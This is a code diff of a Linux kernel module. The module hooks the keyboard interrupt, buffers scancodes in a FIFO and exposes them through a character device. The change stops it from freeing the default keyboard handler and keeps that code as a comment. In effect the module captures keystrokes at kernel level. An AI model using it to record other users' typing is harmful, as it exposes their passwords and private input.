@@ -28,7 +28,7 @@ static int register_char_device(const char*, struct file_operations *);
 static void unregister_char_device(int, const char *);
 
 // IRQ related functions
-static void free_default_kbd_irq(void); 
+// static void free_default_kbd_irq(void); 
 static irqreturn_t intr_handler(int, void *);
 static int register_keyboard_irq(const char *, void *);
 static void unregister_keyboard_irq(void *);
@@ -71,8 +71,8 @@ static ssize_t device_read(struct file* fs, char* buffer, size_t len, loff_t* of
 	return kfifo_out(&keys_fifo, buffer, len);
 }
 
-static ssize_t device_write(struct file* fs, 
-			    const char* buffer, 
+static ssize_t device_write(struct file* fs,
+			    const char* buffer,
 			    size_t size, 
 			    loff_t* offset)
 {
@@ -91,18 +91,25 @@ static void unregister_char_device(int major_number, const char* device_name)
 	unregister_chrdev(major_number, device_name);
 }
 
-static void free_default_kbd_irq()
-{
-	/* Acquire the defualt handler's dev_id */
-	struct irq_desc *kbd_irq = irq_to_desc(KEYBOARD_IRQN);
-	struct irqaction *kbd_action, **kbd_action_ptr;
-
-	kbd_action_ptr = &kbd_irq->action;
-	kbd_action = *kbd_action_ptr;
-
-	free_irq(KEYBOARD_IRQN, kbd_action->dev_id);
-}
-
+ /**
+  * IN ORDER TO FREE THE DEFAULT KBD IRQ:
+  *
+  *  static void free_default_kbd_irq()
+  *  {
+  *
+  *  	// Acquire the defualt handler's dev_id
+  *
+  *  	struct irq_desc *kbd_irq = irq_to_desc(KEYBOARD_IRQN);
+  *
+  *  	struct irqaction *kbd_action, **kbd_action_ptr;
+  *
+  * 	kbd_action_ptr = &kbd_irq->action;
+  * 	kbd_action = *kbd_action_ptr;
+  *
+  * 	free_irq(KEYBOARD_IRQN, kbd_action->dev_id);
+  * }
+ **/
+ 
 static irqreturn_t intr_handler(int irq, void *dev) 
 {
 	static unsigned char scancode = 0;
@@ -162,8 +169,10 @@ static int __init mod_init(void)
 		return -EINVAL;
 	}
 
-	printk(KERN_INFO "freeing default kbd irq\n");
-	free_default_kbd_irq();
+	/* 
+	 * printk(KERN_INFO "freeing default kbd irq\n");
+	 * free_default_kbd_irq();
+	 */
 
 	// Use the keys FIFO as the unique cookie of the irq
 	printk(KERN_INFO "registering keyboard irq..\n");
